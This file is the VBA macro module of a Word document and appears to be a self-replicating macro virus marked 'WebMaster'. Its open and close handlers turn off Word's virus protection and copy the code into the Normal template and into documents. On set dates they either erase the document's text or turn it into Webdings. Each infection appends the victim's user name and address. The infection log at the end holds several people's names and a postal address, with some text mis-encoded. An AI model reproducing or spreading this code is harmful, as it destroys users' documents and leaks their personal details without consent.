   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()

       Options.VirusProtection = False
       Options.SaveNormalPrompt = False

       Const OldMarker = "<- this is another marker!"
       Const Marker = "WebMaster"

       Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
       Dim ad, nt As Object

       Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
       Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

       DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
       NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)

       If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
           ActiveDocument.Select
           Selection.Cut
           ActiveDocument.Save
       ElseIf (Day(Now()) = 13) Then
           ActiveDocument.Select
           Selection.Font.Name = "Webdings"
           ActiveDocument.Save
       End If

       'Make sure that some conditions are true before we continue infecting anything
       If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
           (ActiveDocument.SaveFormat = wdFormatDocument Or _
           ActiveDocument.SaveFormat = wdFormatTemplate) Then


           'Infect the NormalTemplate
           If DocumentInfected = True Then

               SaveNormalTemplate = NormalTemplate.Saved

               OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

               'Write a log file of this NormalTemplate infection
               For I = 1 To Len(Application.UserAddress)
                   If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
                       If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
                           UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
                       End If
                   Else
                       UserAddress = UserAddress & Chr(13) & "' "
                   End If
               Next I

               OurCode = OurCode & Chr(13) & _
                         "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                         Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                         "' " & Application.UserName & Chr(13) & _
                         "' " & UserAddress & Chr(13)

               nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
               nt.CodeModule.AddFromString OurCode

               If SaveNormalTemplate = True Then NormalTemplate.Save

           End If


           'Infect the ActiveDocument
           If NormalTemplateInfected = True And _
               (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
                ActiveDocument.Saved = False) Then

               SaveDocument = ActiveDocument.Saved

               OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

               ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
               ad.CodeModule.AddFromString OurCode

               If SaveDocument = True Then ActiveDocument.Save

           End If

       End If
   End Sub

   Private Sub Document_Open()

       Options.VirusProtection = False
       Options.SaveNormalPrompt = False

       Const OldMarker = "<- this is another marker!"
       Const Marker = "WebMaster"

       Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
       Dim ad, nt As Object

       Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
       Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

       DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
       NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)

       If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
           ActiveDocument.Select
           Selection.Cut
           ActiveDocument.Save
       ElseIf (Day(Now()) = 13) Then
           ActiveDocument.Select
           Selection.Font.Name = "Webdings"
           ActiveDocument.Save
       End If

       'Make sure that some conditions are true before we continue infecting anything
       If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
           (ActiveDocument.SaveFormat = wdFormatDocument Or _
           ActiveDocument.SaveFormat = wdFormatTemplate) Then


           'Infect the NormalTemplate
           If DocumentInfected = True Then

               SaveNormalTemplate = NormalTemplate.Saved

               OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

               'Write a log file of this NormalTemplate infection
               For I = 1 To Len(Application.UserAddress)
                   If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
                       If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
                           UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
                       End If
                   Else
                       UserAddress = UserAddress & Chr(13) & "' "
                   End If
               Next I

               OurCode = OurCode & Chr(13) & _
                         "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                         Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                         "' " & Application.UserName & Chr(13) & _
                         "' " & UserAddress & Chr(13)

               nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
               nt.CodeModule.AddFromString OurCode

               If SaveNormalTemplate = True Then NormalTemplate.Save

           End If


           'Infect the ActiveDocument
           If NormalTemplateInfected = True And _
               (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
                ActiveDocument.Saved = False) Then

               SaveDocument = ActiveDocument.Saved

               OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

               ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
               ad.CodeModule.AddFromString OurCode

               If SaveDocument = True Then ActiveDocument.Save

           End If

       End If
   End Sub
   ' 02:01:14 PM - Sunday, 16 May 1999
   ' USER5
   '



   ' 10:14:21 AM - Monday, 17 May 1999
   ' Neelam Darne
   '



   ' 07:14:45 PM - Wednesday, 2 Jun 1999
   ' Mitesh Sanghani
   '



   ' 04:00:44 PM - Saturday, 5 Jun 1999
   ' xxx
   '



   ' 04:56:42 PM - Monday, 28 Jun 1999
   ' Vijay
   '



   ' 01:17:02 PM - Thursday, 1 Jul 1999
   ' ASIT
   '



   ' 09:11:57 PM - Monday, 12 Jul 1999
   ' nics
   ' jtjeetjetuet
   ' ttjiotiotto
   ' erltjktjkrt



   ' 09:05:43 PM - Wednesday, 11 Aug 1999
   ' nics
   ' jtjeetjetuet
   ' ttjiotiotto
   ' erltjktjkrt



   ' 05:24:44 PM - Monday, 23 Aug 1999
   ' Marketing
   '



   ' 05:28:31 PM - Thursday, 2 Sep 1999
   ' /;p
   '



   ' 02:25:58  - âòîðíèê, 21 ñåí 1999
   ' Naren Apte
   '



   ' 12:59:08  - ïÿòíèöà, 1 îêò 1999
   ' SHV
   '



   ' 11:53:16  - ïîíåäåëüíèê, 18 îêò 1999
   ' SHV
   '



   ' 12:23:09  - ñðåäà, 3 íîÿ 1999
   ' Elena Tabunschikova
   '



   ' 09:48:22 AM - ñðåäà, 1 àâã 2001
   ' Ìàêèåíêî
   ' Ðîññèÿ,115487,Ìîñêâà,
   ' óë.Íàãàòèíñêàÿ,ä.16-à,
   ' ÎÎÎ "ÀÈÐ-ÕÕ1"
   ' ---------------------------------
   ' Ìàêèåíêî À.È.



   ' 09:10:52  - ïÿòíèöà, 21 ñåí 2001
   ' Name
   '



   ' 11:44:55  - ïÿòíèöà, 12 îêò 2001
   ' Name
   '
